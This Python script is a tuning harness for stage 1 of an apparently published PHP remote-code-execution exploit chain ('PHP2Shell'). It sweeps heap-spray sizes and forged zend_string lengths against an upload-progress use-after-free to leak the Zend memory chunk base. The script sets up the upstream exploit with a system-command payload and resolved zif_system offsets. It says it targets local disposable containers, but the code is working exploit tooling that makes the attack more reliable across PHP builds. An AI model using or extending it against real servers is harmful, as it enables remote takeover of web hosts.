#!/usr/bin/env python3
"""Stage-1 (heap leak) sweep for PHP2Shell build profiles.

The published chain locates a *stale* freed zend_string block by spraying N
48-byte fields after the upload-progress UAF and looking for the "vNNNN"
marker to land in the recycled block. The index that lands there depends on
the Zend MM allocator's bin layout, which changes between PHP branches and
patch levels -- so a stage-1 failure on a given build may be a *tuning*
failure rather than a fundamental one.

This tool reuses the upstream chain's request shapes exactly (no new exploit
logic) and sweeps the two stage-1 tunables:

    N          -- number of sprayed fields (how far past the stale block)
    forge_len  -- length of the forged zend_string that turns the stale
                  zval into a 4096-byte copy in the session cookie

For each candidate it reports:
    cookie bytes    -- size of the recovered session cookie
    marker          -- which sprayed field index landed on the stale block
    chunk           -- recovered Zend MM chunk base (the stage-1 goal)

Local disposable containers only.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
import time

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))

import php2shell_calibrate as C  # noqa: E402
import php2shell_matrix as M  # noqa: E402

PYTHON = "/usr/bin/python3"


def start(image: str, port: int, name: str, page: str = "/index.php"):
    M.docker("rm", "-f", name)
    outdir = M.prepare_lab_out(os.path.join(M.LAB, "out", name))
    M.docker(
        "run", "-d", "--name", name,
        "-p", f"127.0.0.1:{port}:80",
        "-v", f"{M.LAB}/webroot:/var/www/html:ro",
        "-v", f"{M.LAB}/php.ini:/usr/local/etc/php/conf.d/zz-matrix.ini:ro",
        "-v", f"{M.LAB}/apache.conf:/etc/apache2/conf-enabled/zz-matrix.conf:ro",
        "-v", f"{outdir}:/out",
        image, timeout=900,
    )
    url = f"http://127.0.0.1:{port}{page}"
    if not M.wait_http(url):
        raise SystemExit("replica did not answer")
    return url, outdir


def attempt(mod, ex, n: int, forge_len: int, val_len: int = 48) -> dict:
    """One stage-1 attempt using the upstream request sequence.

    The upstream sequence is a priming POST (1001 parts + upload-progress +
    12 MiB field) followed by the spray POST. The priming request is what
    leaves the session id in a freed block, so the spray must follow it
    exactly -- an earlier version of this tool skipped the priming request
    and therefore never reproduced the corruption.

    val_len selects the sprayed value's length. It matters because the
    corrupted session id has to be exactly session.sid_length characters
    (32 by default) for PHP to accept it; the published chain hardcodes 48,
    which PHP rejects with "Session ID is too long".
    """
    ex.rotate()
    raw = C._cookie(C._stage1_parts(mod, ex, n, forge_len, val_len))
    base = C.chunk_base(raw)
    m = re.search(rb"v(\d{4})", raw)
    return {
        "n": n,
        "forge_len": forge_len,
        "val_len": val_len,
        "cookie_len": len(raw),
        "marker": int(m.group(1)) if m else None,
        "chunk": hex(base) if base else None,
        "raw": raw,
    }


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--image", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--name", required=True)
    ap.add_argument("--ns", default="100,200,300,400,500,600,700,800,841,900,1000,1200,1500")
    ap.add_argument("--lens", default="48,63,79")
    ap.add_argument("--val-lens", default="48")
    ap.add_argument("--dump", action="store_true", help="print raw cookie hex")
    ap.add_argument("--page", default="/index.php")
    ap.add_argument("--out", default=None)
    args = ap.parse_args()

    ns = [int(x) for x in args.ns.split(",") if x]
    lens = [int(x) for x in args.lens.split(",") if x]
    vlens = [int(x) for x in args.val_lens.split(",") if x]

    url, _ = start(args.image, args.port, args.name, args.page)
    sym = C.extract_symbols(VENDOR, args.name)
    mod = C.load_upstream(VENDOR)
    t = mod.Target(url, verbose=False)
    ex = mod.Exploit(t, "id>/out/p1", zif_offset=sym["zif_system"],
                     dtor_offset=sym["zval_ptr_dtor"], profile="bookworm", verbose=False)

    print(f"[*] {args.image}  zif={hex(sym['zif_system'])} dtor={hex(sym['zval_ptr_dtor'])}")
    print("%-6s %-6s %-8s %-10s %-9s %s" % ("vlen", "N", "flen", "cookie", "marker", "chunk"))
    rows = []
    hit = False
    for vlen in vlens:
        for n in ns:
            for flen in lens:
                r = attempt(mod, ex, n, flen, vlen)
                print("%-6d %-6d %-8d %-10d %-9s %s" % (
                    r["val_len"], r["n"], r["forge_len"], r["cookie_len"],
                    r["marker"] if r["marker"] is not None else "-",
                    r["chunk"] or "-"))
                if args.dump and r["raw"]:
                    print("    raw[%d]: %s" % (len(r["raw"]), r["raw"][:160].hex()))
                rows.append({k: v for k, v in r.items() if k != "raw"})
                if r["chunk"]:
                    print("[+] stage-1 leak found", flush=True)
                    hit = True
                    break
            if hit:
                break
        if hit:
            break

    if args.out:
        json.dump(rows, open(args.out, "w", encoding="utf-8"), indent=2)
    M.docker("rm", "-f", args.name)
    return 0


if __name__ == "__main__":
    sys.exit(main())
